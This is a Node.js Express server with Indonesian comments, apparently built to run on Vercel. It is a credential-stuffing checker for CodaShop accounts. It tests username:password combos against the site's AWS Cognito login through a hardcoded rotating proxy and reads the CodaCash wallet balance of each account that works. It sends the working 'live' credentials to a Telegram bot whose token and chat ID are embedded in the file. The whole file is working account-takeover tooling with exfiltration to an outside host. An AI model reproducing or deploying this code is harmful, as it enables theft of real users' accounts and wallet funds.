const express = require('express');
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Telegram Config
const TELEGRAM_TOKEN = "8510209497:AAE9n-1ReyEngaDOEDJZbTzpkR9U5POlN-w";
const TELEGRAM_CHATID = "7705761344";

// Proxy Setup
const proxyStr = "http://8998c0d8430265a3c9ab:f4cd725960d1892a@gw.dataimpulse.com:823";
const proxyAgent = new HttpsProxyAgent(proxyStr);

// Helper function untuk kirim ke Telegram
async function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    // Memecah pesan jika terlalu panjang (limit Telegram 4096)
    const chunks = message.match(/[\s\S]{1,4000}/g) || [];
    
    for (const chunk of chunks) {
        try {
            await axios.post(url, {
                chat_id: TELEGRAM_CHATID,
                text: chunk,
                parse_mode: 'html'
            });
            // Delay 500ms agar tidak kena rate-limit
            await new Promise(resolve => setTimeout(resolve, 500));
        } catch (error) {
            console.error('Telegram Error:', error?.response?.data || error.message);
        }
    }
}

// Endpoint: Kirim Bulk Live ke Telegram
app.post('/api/send-bulk', async (req, res) => {
    const lives_data = req.body.lives_data || '';
    if (lives_data) {
        const safe_data = lives_data.replace(/</g, "&lt;").replace(/>/g, "&gt;");
        const tele_msg = `<b>✅ REKAP LIVE ACCOUNTS</b>\n━━━━━━━━━━━━━━━━━━\n<code>${safe_data}</code>\n━━━━━━━━━━━━━━━━━━\n🤖 <i>Checker Selesai!</i>`;
        
        await sendToTelegram(tele_msg);
        return res.json({ status: 'ok' });
    }
    return res.status(400).json({ status: 'error', msg: 'No data' });
});

// Endpoint: Cek Akun CodaShop
app.post('/api/check', async (req, res) => {
    try {
        const combo = (req.body.account || '').trim();
        const parts = combo.replace(/\||;| /g, ':').split(':');
        
        if (parts.length < 2) {
            return res.json({ status: 'die', msg: 'Format Salah', acc: combo });
        }

        const username = parts[0].trim();
        const password = parts[1].trim();

        const auth_payload = {
            AuthFlow: "USER_PASSWORD_AUTH",
            ClientId: "437f3u0sfh7h0av5rlrrjdtmsb",
            AuthParameters: { USERNAME: username, PASSWORD: password },
            ClientMetadata: { country_code: "ph", lang_code: "en" }
        };

        // 1. Hit AWS Cognito
        const authRes = await axios.post("https://cognito-idp.ap-southeast-1.amazonaws.com/", auth_payload, {
            headers: {
                "x-amz-target": "AWSCognitoIdentityProviderService.InitiateAuth",
                "Content-Type": "application/x-amz-json-1.1"
            },
            httpsAgent: proxyAgent,
            timeout: 20000
        });

        if (authRes.data && authRes.data.AuthenticationResult) {
            const id_token = authRes.data.AuthenticationResult.IdToken;

            // 2. Cek Balance di CodaCash Wallet
            try {
                const walletRes = await axios.get("https://wallet-api.codacash.com/user/wallet", {
                    headers: {
                        "Authorization": id_token,
                        "x-country-code": "608"
                    },
                    httpsAgent: proxyAgent,
                    timeout: 15000
                });

                if (walletRes.data && walletRes.data.data) {
                    const bal_val = walletRes.data.data.balanceAmount;
                    return res.json({ status: 'live', msg: `Balance: ${bal_val}`, acc: `${username}:${password}` });
                } else {
                    return res.json({ status: 'live', msg: 'Balance: 0', acc: `${username}:${password}` });
                }
            } catch (walletErr) {
                // Jika gagal fetch wallet tapi auth sukses, tetep masukin ke live
                return res.json({ status: 'live', msg: 'Balance: Cek Manual', acc: `${username}:${password}` });
            }
        }

    } catch (error) {
        // Handle Error Authentication
        const errorData = error.response?.data;
        const msg = errorData ? (errorData.__type || errorData.message || 'Invalid Credentials') : 'Connection Timeout/Error';
        const cleanMsg = msg.replace('Exception', '');
        
        return res.json({ status: 'die', msg: cleanMsg, acc: req.body.account });
    }
});

// Export handler untuk Vercel Serverless
module.exports = app;
